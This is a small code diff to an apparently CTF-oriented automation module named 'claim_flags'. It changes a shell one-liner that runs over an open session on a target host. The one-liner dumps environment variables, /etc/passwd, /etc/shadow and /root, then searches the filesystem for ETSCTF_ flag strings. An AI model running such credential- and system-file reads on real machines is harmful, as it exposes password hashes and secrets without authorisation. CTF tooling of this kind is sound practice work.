@@ -79,7 +79,7 @@ class claim_flags(Module):
 
         # Uses the onliner to get all flags on the system
         def search_flags():
-            one_liner = r"""P='ETSCTF_[0-9a-fA-F]{32}';{ for F in env /etc/passwd /proc/1/environ /etc/shadow /root/; do case $F in env) env ;; /proc/1/environ) tr '\0' '\n' <"$F" 2>/dev/null ;; /root/) ls -A "$F" 2>/dev/null ;; *) cat "$F" 2>/dev/null ;; esac; done; find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /etc \) -prune -o -type f -print0 2>/dev/null | xargs -0 -r grep -aHoE "$P" 2>/dev/null | awk -F: '{print $2}'; find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /etc \) -prune -o -name '*ETSCTF_*' -print 2>/dev/null | xargs -r -n1 -I{} basename {} 2>/dev/null; } | grep -oE "$P" | sed '/^$/d' | awk '!seen[$0]++'"""
+            one_liner = r"""P='ETSCTF_[0-9a-fA-F]{32}';{ for F in env /etc/passwd /proc/1/environ /etc/shadow /root/; do case $F in env) env ;; /proc/1/environ) tr '\0' '\n' <"$F" 2>/dev/null ;; /root/) ls -A "$F" 2>/dev/null ;; *) cat "$F" 2>/dev/null ;; esac; done; find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /etc \) -prune -o -type f -print0 2>/dev/null | xargs -0 -r grep -aHoE "$P" 2>/dev/null | awk -F: '{print $2}'; find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /etc \) -prune -o -name '*ETSCTF_*' -print 2>/dev/null | xargs -r -n1 -I{} basename {} 2>/dev/null; } | grep -oE "$P" | sed '/^$/d' | awk '!seen[$0]++' 2>/dev/null"""
             logger.info("Buscando banderas...")
             flags = session.exec(one_liner, timeout=20, agent_typing=True, value=True)
             if flags:
